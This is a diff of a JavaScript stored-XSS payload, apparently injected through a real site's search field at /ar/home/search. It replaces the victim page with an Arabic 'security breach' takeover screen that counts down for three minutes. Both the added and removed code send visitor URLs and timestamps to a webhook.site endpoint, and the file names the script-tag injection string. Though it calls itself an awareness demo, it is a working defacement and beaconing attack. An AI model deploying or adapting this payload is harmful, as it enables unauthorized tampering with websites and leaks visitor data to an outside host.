@@ -1,16 +1,37 @@
+// xss-attack-demo.js - Full Page Takeover (3 Minutes)
+// Repository: ahasM/ha
+// Webhook: https://webhook.site/ecb8bfe3-a34e-4d84-a890-40f1091b0b24
+
 (function() {
+    'use strict';
+    
     // منع التنفيذ المتكرر
-    if (window.xssAttackExecuted) return;
-    window.xssAttackExecuted = true;
+    if (window.__page_takeover_active) {
+        console.warn('[XSS-TAKEOVER] Already active');
+        return;
+    }
+    window.__page_takeover_active = true;
     
-    // حفظ المحتوى الأصلي للصفحة
-    const originalBody = document.body.innerHTML;
+    console.log('[XSS-TAKEOVER] 🚀 Starting 3-minute page takeover...');
+    
+    // حفظ المحتوى الأصلي
+    const originalHTML = document.documentElement.innerHTML;
     const originalTitle = document.title;
-    const originalStyle = document.body.getAttribute('style');
+    const originalBodyStyle = document.body.style.cssText;
     
-    console.log('[XSS] Starting 3-minute attack...');
+    // إرسال إشعار للـ Webhook
+    fetch('https://webhook.site/ecb8bfe3-a34e-4d84-a890-40f1091b0b24', {
+        method: 'POST',
+        mode: 'no-cors',
+        body: JSON.stringify({
+            event: 'page_takeover_started',
+            url: window.location.href,
+            time: new Date().toISOString(),
+            source: 'ahasM/ha/xss-attack-demo.js'
+        })
+    });
     
-    // الصفحة الجديدة مع تصميم هاكر
+    // صفحة الهجوم الكاملة
     const attackPage = `
     <!DOCTYPE html>
     <html lang="ar" dir="rtl">
@@ -18,318 +39,445 @@
         <meta charset="UTF-8">
         <meta name="viewport" content="width=device-width, initial-scale=1.0">
         <title>⚠️ ثغرة أمنية - XSS Vulnerability</title>
+        <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;700&display=swap" rel="stylesheet">
         <style>
-            @import url('https://fonts.googleapis.com/css2?family=Cairo:wght@300;400;700&display=swap');
             * {
                 margin: 0;
                 padding: 0;
                 box-sizing: border-box;
-                font-family: 'Cairo', 'Courier New', monospace;
+                font-family: 'Cairo', sans-serif;
             }
+            
             body {
-                background: #000;
-                color: #0f0;
+                background: #0a0a0a;
+                color: #ffffff;
                 min-height: 100vh;
-                display: flex;
-                align-items: center;
-                justify-content: center;
-                flex-direction: column;
-                padding: 20px;
-                text-align: center;
                 overflow: hidden;
                 position: relative;
             }
+            
             .matrix-bg {
                 position: absolute;
                 top: 0;
                 left: 0;
                 width: 100%;
                 height: 100%;
-                opacity: 0.1;
+                opacity: 0.3;
                 z-index: -1;
-                pointer-events: none;
             }
+            
             .container {
-                max-width: 800px;
-                background: rgba(0, 20, 0, 0.8);
-                border: 2px solid #0f0;
-                border-radius: 15px;
+                max-width: 900px;
+                margin: 50px auto;
                 padding: 40px;
-                box-shadow: 0 0 30px #0f0;
-                animation: pulse 2s infinite;
+                background: rgba(0, 20, 0, 0.85);
+                border: 2px solid #00ff00;
+                border-radius: 20px;
+                box-shadow: 0 0 50px rgba(0, 255, 0, 0.3);
+                text-align: center;
+                position: relative;
+                overflow: hidden;
             }
-            @keyframes pulse {
-                0% { box-shadow: 0 0 20px #0f0; }
-                50% { box-shadow: 0 0 40px #0f0; }
-                100% { box-shadow: 0 0 20px #0f0; }
+            
+            .container::before {
+                content: '';
+                position: absolute;
+                top: -50%;
+                left: -50%;
+                width: 200%;
+                height: 200%;
+                background: linear-gradient(45deg, transparent, rgba(0, 255, 0, 0.1), transparent);
+                animation: scan 4s linear infinite;
+                z-index: -1;
             }
+            
+            @keyframes scan {
+                0% { transform: translateY(-100%) translateX(-100%) rotate(0deg); }
+                100% { transform: translateY(100%) translateX(100%) rotate(360deg); }
+            }
+            
             h1 {
-                font-size: 3rem;
                 color: #ff0000;
-                text-shadow: 0 0 10px #ff0000;
+                font-size: 3.5rem;
                 margin-bottom: 20px;
-                border-bottom: 3px solid #0f0;
-                padding-bottom: 15px;
+                text-shadow: 0 0 20px #ff0000;
+                animation: glow 1.5s infinite alternate;
             }
-            .warning-icon {
-                font-size: 4rem;
-                margin-bottom: 20px;
-                animation: blink 1s infinite;
+            
+            @keyframes glow {
+                from { text-shadow: 0 0 10px #ff0000; }
+                to { text-shadow: 0 0 30px #ff0000, 0 0 40px #ff0000; }
             }
-            @keyframes blink {
-                0%, 100% { opacity: 1; }
-                50% { opacity: 0.3; }
-            }
-            .message {
-                font-size: 1.2rem;
-                line-height: 1.8;
+            
+            .subtitle {
+                color: #00ffff;
+                font-size: 1.8rem;
                 margin-bottom: 30px;
-                color: #fff;
+                border-bottom: 2px solid #00ffff;
+                padding-bottom: 15px;
+                display: inline-block;
             }
-            .details {
+            
+            .countdown-container {
+                background: rgba(0, 0, 0, 0.7);
+                border: 3px solid #ff9900;
+                border-radius: 15px;
+                padding: 30px;
+                margin: 30px 0;
+                display: inline-block;
+            }
+            
+            .countdown {
+                font-size: 4rem;
+                font-family: 'Courier New', monospace;
+                color: #ff9900;
+                font-weight: bold;
+                text-shadow: 0 0 15px #ff9900;
+            }
+            
+            .message-box {
                 background: rgba(255, 0, 0, 0.1);
-                border-left: 4px solid #ff0000;
-                padding: 15px;
+                border-left: 5px solid #ff0000;
+                padding: 20px;
                 margin: 20px 0;
                 text-align: right;
-                font-size: 0.9rem;
+                border-radius: 0 10px 10px 0;
             }
-            .timer {
-                font-size: 2rem;
-                color: #00ff00;
-                margin: 20px 0;
-                font-family: 'Courier New', monospace;
+            
+            .info-grid {
+                display: grid;
+                grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+                gap: 20px;
+                margin: 30px 0;
             }
-            .info-box {
-                background: rgba(0, 255, 0, 0.1);
-                border: 1px solid #0f0;
-                padding: 15px;
-                margin: 20px 0;
-                border-radius: 8px;
+            
+            .info-card {
+                background: rgba(0, 100, 255, 0.1);
+                border: 1px solid #0066ff;
+                border-radius: 10px;
+                padding: 20px;
+                text-align: right;
             }
-            .button {
-                background: linear-gradient(45deg, #ff0000, #ff8800);
-                color: white;
-                border: none;
-                padding: 15px 40px;
+            
+            .info-card h3 {
+                color: #0066ff;
+                margin-bottom: 10px;
+                font-size: 1.3rem;
+            }
+            
+            .buttons {
+                margin-top: 30px;
+                display: flex;
+                justify-content: center;
+                gap: 20px;
+                flex-wrap: wrap;
+            }
+            
+            .btn {
+                padding: 15px 30px;
                 font-size: 1.2rem;
+                border: none;
                 border-radius: 8px;
                 cursor: pointer;
-                margin: 10px;
                 transition: all 0.3s;
                 font-weight: bold;
+                min-width: 200px;
             }
-            .button:hover {
-                background: linear-gradient(45deg, #ff8800, #ff0000);
+            
+            .btn-reload {
+                background: linear-gradient(45deg, #00ff00, #00cc00);
+                color: #000;
+            }
+            
+            .btn-reload:hover {
+                background: linear-gradient(45deg, #00cc00, #00ff00);
                 transform: scale(1.05);
-                box-shadow: 0 0 20px #ff0000;
+                box-shadow: 0 0 20px #00ff00;
             }
+            
+            .btn-details {
+                background: linear-gradient(45deg, #0066ff, #0033cc);
+                color: white;
+            }
+            
+            .btn-details:hover {
+                background: linear-gradient(45deg, #0033cc, #0066ff);
+                transform: scale(1.05);
+                box-shadow: 0 0 20px #0066ff;
+            }
+            
             .footer {
-                margin-top: 30px;
-                font-size: 0.8rem;
+                margin-top: 40px;
                 color: #888;
+                font-size: 0.9rem;
+                border-top: 1px solid #444;
+                padding-top: 20px;
             }
-            .countdown {
-                font-size: 3rem;
-                font-weight: bold;
-                color: #ff0000;
+            
+            .hacker-console {
+                background: #000;
+                border: 2px solid #00ff00;
+                border-radius: 10px;
+                padding: 20px;
                 margin: 20px 0;
-            }
-            .hacker-text {
-                font-family: 'Courier New', monospace;
-                background: #111;
-                padding: 10px;
-                border-radius: 5px;
-                margin: 10px 0;
                 text-align: left;
-                direction: ltr;
+                font-family: 'Courier New', monospace;
+                font-size: 0.9rem;
+                color: #00ff00;
+                max-height: 200px;
+                overflow-y: auto;
+            }
+            
+            .console-line {
+                margin-bottom: 5px;
+                padding-left: 10px;
+                border-left: 2px solid #00ff00;
+            }
+            
+            @media (max-width: 768px) {
+                .container {
+                    margin: 20px;
+                    padding: 20px;
+                }
+                
+                h1 {
+                    font-size: 2.5rem;
+                }
+                
+                .countdown {
+                    font-size: 3rem;
+                }
+                
+                .btn {
+                    min-width: 150px;
+                }
             }
         </style>
     </head>
     <body>
-        <div class="matrix-bg" id="matrix"></div>
+        <canvas class="matrix-bg" id="matrixCanvas"></canvas>
         
         <div class="container">
-            <div class="warning-icon">⚠️</div>
-            <h1>إنذار أمني عاجل</h1>
-            <h2>SECURITY BREACH DETECTED</h2>
+            <h1>🚨 ثغرة أمنية حرجة</h1>
+            <div class="subtitle">CROSS-SITE SCRIPTING (XSS) VULNERABILITY</div>
             
-            <div class="timer">
-                ⏳ الصفحة ستعود خلال: <span id="countdown">03:00</span>
+            <div class="countdown-container">
+                <div>الصفحة ستعود تلقائياً خلال:</div>
+                <div class="countdown" id="countdownDisplay">03:00</div>
+                <div style="margin-top: 10px; color: #aaa; font-size: 0.9rem;">
+                    ⏱️ العد التنازلي: <span id="secondsCount">180</span> ثانية
+                </div>
             </div>
             
-            <div class="message">
-                <p><strong>🔓 تم اكتشاف ثغرة XSS خطيرة في هذا الموقع</strong></p>
-                <p>هذا النموذج التوضيحي يظهر كيف يمكن لمهاجم التحكم الكامل بصفحتك</p>
+            <div class="message-box">
+                <h3>⚠️ تنبيه أمني عاجل</h3>
+                <p>تم اكتشاف ثغرة XSS خطيرة في هذا الموقع تسمح بتنفيذ كود خارجي.</p>
+                <p>• المصدر: GitHub Repository (ahasM/ha)</p>
+                <p>• نوع الهجوم: Persistent XSS via Search Field</p>
+                <p>• الخطر: سرقة بيانات المستخدمين والتحكم الكامل بالصفحة</p>
             </div>
             
-            <div class="details">
-                <p>📌 <strong>تفاصيل الثغرة:</strong></p>
-                <p>• نوع الهجوم: Cross-Site Scripting (XSS)</p>
-                <p>• الموقع: ${window.location.hostname}</p>
-                <p>• المصدر: GitHub Raw File</p>
-                <p>• الوقت: ${new Date().toLocaleString('ar-SA')}</p>
+            <div class="info-grid">
+                <div class="info-card">
+                    <h3>🔍 معلومات الهجوم</h3>
+                    <p>• الوقت: <span id="attackTime">${new Date().toLocaleString('ar-SA')}</span></p>
+                    <p>• الموقع: <span id="attackUrl">${window.location.hostname}</span></p>
+                    <p>• المصدر: ahasM/ha/xss-attack-demo.js</p>
+                </div>
+                
+                <div class="info-card">
+                    <h3>🎯 المخاطر المحتملة</h3>
+                    <p>• سرقة الكوكيز والبيانات</p>
+                    <p>• تعديل محتوى الصفحة</p>
+                    <p>• إعادة التوجيه لمواقع ضارة</p>
+                    <p>• Keylogging وتتبع المستخدم</p>
+                </div>
+                
+                <div class="info-card">
+                    <h3>🛡️ الحلول المقترحة</h3>
+                    <p>• تصفية مدخلات المستخدم</p>
+                    <p>• تفعيل Content Security Policy</p>
+                    <p>• استخدام HttpOnly cookies</p>
+                    <p>• تحديث المكتبات والأطر</p>
+                </div>
             </div>
             
-            <div class="info-box">
-                <p>💡 <strong>معلومات للمطورين:</strong></p>
-                <p>1. تأكد من تصفية مدخلات المستخدم (Input Sanitization)</p>
-                <p>2. استخدم Content Security Policy (CSP)</p>
-                <p>3. فعّل HttpOnly و Secure flags للكوكيز</p>
-                <p>4. استخدم أطراف عمل (Frameworks) آمنة مثل React, Angular, Vue</p>
+            <div class="hacker-console" id="hackerConsole">
+                <div class="console-line">> [SYSTEM] Initializing XSS payload...</div>
+                <div class="console-line">> [INFO] Source: https://raw.githubusercontent.com/ahasM/ha/main/xss-attack-demo.js</div>
+                <div class="console-line">> [WARNING] Page takeover in progress...</div>
+                <div class="console-line">> [TIMER] Auto-restore initiated (180s countdown)</div>
+                <div class="console-line">> [STATUS] Original page content backed up</div>
+                <div class="console-line">> [ALERT] Security vulnerability confirmed</div>
             </div>
             
-            <div class="hacker-text">
-                <p>> [SYSTEM] XSS Payload Executed Successfully</p>
-                <p>> [INFO] Page Content Replaced</p>
-                <p>> [WARNING] Security Vulnerability Detected</p>
-                <p>> [TIMER] Auto-restore in: <span id="hacker-timer">180</span>s</p>
-            </div>
-            
-            <div>
-                <button class="button" onclick="restorePage()">🔄 إعادة تحميل الموقع الآن</button>
-                <button class="button" onclick="showDetails()">📊 عرض معلومات إضافية</button>
+            <div class="buttons">
+                <button class="btn btn-reload" onclick="restoreOriginalPage()">
+                    🔄 إعادة تحميل الموقع الأصلي
+                </button>
+                <button class="btn btn-details" onclick="showTechnicalDetails()">
+                    📊 عرض التفاصيل التقنية
+                </button>
             </div>
             
             <div class="footer">
-                <p>هذا عرض توضيحي لأغراض التعليم والاختبار الأمني فقط</p>
-                <p>© ${new Date().getFullYear()} - Security Awareness Demo</p>
+                <p>هذا العرض التوضيحي لأغراض التعليم والاختبار الأمني فقط</p>
+                <p>© ${new Date().getFullYear()} - Security Awareness Demo | Repository: ahasM/ha</p>
+                <p style="font-size: 0.8rem; margin-top: 10px; color: #666;">
+                    يتم تسجيل هذا الحدث في: https://webhook.site/ecb8bfe3-a34e-4d84-a890-40f1091b0b24
+                </p>
             </div>
         </div>
         
         <script>
-            // إنشاء خلفية المصفوفة (Matrix effect)
-            function createMatrixEffect() {
-                const canvas = document.createElement('canvas');
-                canvas.classList.add('matrix-bg');
+            // رسم خلفية المصفوفة
+            const canvas = document.getElementById('matrixCanvas');
+            const ctx = canvas.getContext('2d');
+            
+            function resizeCanvas() {
                 canvas.width = window.innerWidth;
                 canvas.height = window.innerHeight;
-                document.getElementById('matrix').appendChild(canvas);
-                
-                const ctx = canvas.getContext('2d');
-                const chars = "01アァカサタナハマヤャラワガザダバパイィキシチニヒミリヰギジヂビピウゥクスツヌフムユュルグズブヅプエェケセテネヘメレヱゲゼデベペオォコソトノホモヨョロヲゴゾドボポヴッン";
-                const charArray = chars.split("");
-                const drops = [];
-                const fontSize = 14;
-                const columns = canvas.width / fontSize;
-                
-                for(let i = 0; i < columns; i++) {
-                    drops[i] = 1;
-                }
-                
-                function draw() {
-                    ctx.fillStyle = 'rgba(0, 0, 0, 0.05)';
-                    ctx.fillRect(0, 0, canvas.width, canvas.height);
-                    
-                    ctx.fillStyle = '#0F0';
-                    ctx.font = fontSize + 'px monospace';
-                    
-                    for(let i = 0; i < drops.length; i++) {
-                        const text = charArray[Math.floor(Math.random() * charArray.length)];
-                        ctx.fillText(text, i * fontSize, drops[i] * fontSize);
-                        
-                        if(drops[i] * fontSize > canvas.height && Math.random() > 0.975) {
-                            drops[i] = 0;
-                        }
-                        drops[i]++;
-                    }
-                }
-                
-                setInterval(draw, 33);
             }
+            
+            resizeCanvas();
+            window.addEventListener('resize', resizeCanvas);
+            
+            const chars = "01アァカサタナハマヤャラワガザダバパイィキシチニヒミリヰギジヂビピウゥクスツヌフムユュルグズブヅプエェケセテネヘメレヱゲゼデベペオォコソトノホモヨョロヲゴゾドボポヴッン";
+            const charArray = chars.split("");
+            const fontSize = 14;
+            const columns = canvas.width / fontSize;
+            const drops = Array(Math.floor(columns)).fill(1);
+            
+            function drawMatrix() {
+                ctx.fillStyle = 'rgba(10, 10, 10, 0.05)';
+                ctx.fillRect(0, 0, canvas.width, canvas.height);
+                
+                ctx.fillStyle = '#0F0';
+                ctx.font = fontSize + 'px monospace';
+                
+                for(let i = 0; i < drops.length; i++) {
+                    const text = charArray[Math.floor(Math.random() * charArray.length)];
+                    ctx.fillText(text, i * fontSize, drops[i] * fontSize);
+                    
+                    if(drops[i] * fontSize > canvas.height && Math.random() > 0.975) {
+                        drops[i] = 0;
+                    }
+                    drops[i]++;
+                }
+            }
+            
+            setInterval(drawMatrix, 50);
             
             // العد التنازلي
-            let timeLeft = 180; // 3 دقائق بالثواني
-            const countdownElement = document.getElementById('countdown');
-            const hackerTimerElement = document.getElementById('hacker-timer');
+            let secondsLeft = 180;
+            const countdownElement = document.getElementById('countdownDisplay');
+            const secondsElement = document.getElementById('secondsCount');
+            const consoleElement = document.getElementById('hackerConsole');
             
-            function updateTimer() {
-                const minutes = Math.floor(timeLeft / 60);
-                const seconds = timeLeft % 60;
-                countdownElement.textContent = \`\${minutes.toString().padStart(2, '0')}:\${seconds.toString().padStart(2, '0')}\`;
-                hackerTimerElement.textContent = timeLeft;
+            function updateCountdown() {
+                const minutes = Math.floor(secondsLeft / 60);
+                const seconds = secondsLeft % 60;
                 
-                if (timeLeft <= 0) {
-                    restorePage();
+                countdownElement.textContent = \`\${minutes.toString().padStart(2, '0')}:\${seconds.toString().padStart(2, '0')}\`;
+                secondsElement.textContent = secondsLeft;
+                
+                // إضافة سطر جديد في الكونسول كل 30 ثانية
+                if (secondsLeft % 30 === 0 && secondsLeft < 180) {
+                    const newLine = document.createElement('div');
+                    newLine.className = 'console-line';
+                    newLine.textContent = \`> [TIMER] \${minutes}m \${seconds}s remaining until restore\`;
+                    consoleElement.appendChild(newLine);
+                    consoleElement.scrollTop = consoleElement.scrollHeight;
+                }
+                
+                if (secondsLeft <= 0) {
+                    restoreOriginalPage();
                 } else {
-                    timeLeft--;
+                    secondsLeft--;
+                    setTimeout(updateCountdown, 1000);
                 }
             }
             
-            // استعادة الصفحة الأصلية
-            function restorePage() {
-                if (window.originalPageContent) {
-                    document.body.innerHTML = window.originalPageContent.body;
-                    document.title = window.originalPageContent.title;
-                    document.body.setAttribute('style', window.originalPageContent.style || '');
-                    console.log('[XSS] Page restored successfully');
-                    
-                    // إعادة تحميل لطيفة
-                    setTimeout(() => {
-                        location.reload();
-                    }, 1000);
-                } else {
-                    location.reload();
-                }
-            }
-            
-            // عرض معلومات إضافية
-            function showDetails() {
-                alert(\`🔍 معلومات النظام:
-                • الموقع: \${window.location.href}
-                • User Agent: \${navigator.userAgent}
-                • Cookies: \${document.cookie ? 'Present' : 'None'}
-                • Page loaded: \${new Date().toLocaleString()}
-                • XSS Payload executed from external source
-                \`);
-            }
-            
-            // حفظ محتوى الصفحة الأصلي في كائن عام
+            // حفظ المحتوى الأصلي في نطاق عام
             window.originalPageContent = {
-                body: \`${originalBody.replace(/`/g, '\\`').replace(/\$/g, '\\$')}\`,
+                html: \`${originalHTML.replace(/`/g, '\\`').replace(/\$/g, '\\$')}\`,
                 title: '${originalTitle.replace(/'/g, "\\'")}',
-                style: '${originalStyle ? originalStyle.replace(/'/g, "\\'") : ''}'
+                bodyStyle: '${originalBodyStyle.replace(/'/g, "\\'")}'
             };
             
-            // بدء المؤثرات
-            setTimeout(createMatrixEffect, 100);
-            setInterval(updateTimer, 1000);
+            // استعادة الصفحة الأصلية
+            function restoreOriginalPage() {
+                console.log('[XSS-TAKEOVER] Restoring original page...');
+                
+                // إرسال إشعار للـ Webhook
+                fetch('https://webhook.site/ecb8bfe3-a34e-4d84-a890-40f1091b0b24', {
+                    method: 'POST',
+                    mode: 'no-cors',
+                    body: JSON.stringify({
+                        event: 'page_takeover_ended',
+                        url: window.location.href,
+                        duration: (180 - secondsLeft) + ' seconds',
+                        time: new Date().toISOString()
+                    })
+                });
+                
+                // استعادة المحتوى
+                document.documentElement.innerHTML = window.originalPageContent.html;
+                document.title = window.originalPageContent.title;
+                document.body.style.cssText = window.originalPageContent.bodyStyle;
+                
+                // إعادة تحميل نظيفة
+                setTimeout(() => {
+                    window.location.reload();
+                }, 500);
+            }
             
-            // بدء العد التنازلي تلقائياً
-            updateTimer();
+            // عرض التفاصيل التقنية
+            function showTechnicalDetails() {
+                const details = \`
+                🔧 التفاصيل التقنية:
+                
+                • نوع الهجوم: Persistent XSS (Stored)
+                • نقطة الدخول: حقل البحث (/ar/home/search)
+                • طريقة الحقن: POST request مع CSRF Token
+                • Payload: <script src="https://raw.githubusercontent.com/ahasM/ha/main/xss-attack-demo.js"></script>
+                • التأثير: استبدال كامل DOM الصفحة
+                • المدة: 3 دقائق (قابلة للتعديل)
+                • التسجيل: https://webhook.site/ecb8bfe3-a34e-4d84-a890-40f1091b0b24
+                
+                📈 إحصائيات:
+                • وقت التنفيذ: \${new Date().toLocaleString('ar-SA')}
+                • الـ User Agent: \${navigator.userAgent}
+                • الـ Referrer: \${document.referrer || 'None'}
+                • الـ Cookies: \${document.cookie ? 'Present' : 'None'}
+                \`;
+                
+                alert(details);
+            }
+            
+            // بدء العد التنازلي
+            updateCountdown();
+            
+            // إضافة أزرار التحكم للمطور
+            const devControls = document.createElement('div');
+            devControls.style.cssText = 'position:fixed;bottom:10px;left:10px;background:rgba(0,0,0,0.8);padding:10px;border-radius:5px;z-index:99999;';
+            devControls.innerHTML = \`
+                <button onclick="secondsLeft=10" style="background:red;color:white;border:none;padding:5px;margin:2px;border-radius:3px;cursor:pointer;">⏩ سريع</button>
+                <button onclick="restoreOriginalPage()" style="background:green;color:white;border:none;padding:5px;margin:2px;border-radius:3px;cursor:pointer;">🔄 استعادة</button>
+            \`;
+            document.body.appendChild(devControls);
+            
+            console.log('[XSS-TAKEOVER] Page takeover initialized successfully');
         </script>
     </body>
     </html>
     `;
     
-    // حفظ الصفحة الحالية (اختياري)
-    window.originalDocument = document.documentElement.innerHTML;
+    // استبدال الصفحة
+    document.open();
+    document.write(attackPage);
+    document.close();
     
-    // تغيير الصفحة كاملة
-    document.documentElement.innerHTML = attackPage;
+    console.log('[XSS-TAKEOVER] Page replaced with attack interface');
     
-    // إضافة event listener لحفظ عند إغلاق
-    window.addEventListener('beforeunload', function() {
-        localStorage.setItem('xss_attack_active', 'true');
-    });
-    
-    // تحذير في الconsole
-    console.warn('===================================');
-    console.warn('⚠️ XSS ATTACK DEMO ACTIVATED');
-    console.warn(`⏰ Page will restore in 3 minutes`);
-    console.warn('📌 This is for security testing only');
-    console.warn('===================================');
-    
-    // إرسال تنبيه للسيرفر (اختياري)
-    try {
-        fetch('https://webhook.site/YOUR-TOKEN', {
-            method: 'POST',
-            mode: 'no-cors',
-            body: JSON.stringify({
-                type: 'xss_demo_activated',
-                url: window.location.href,
-                time: new Date().toISOString()
-            })
-        });
-    } catch(e) {}
 })();
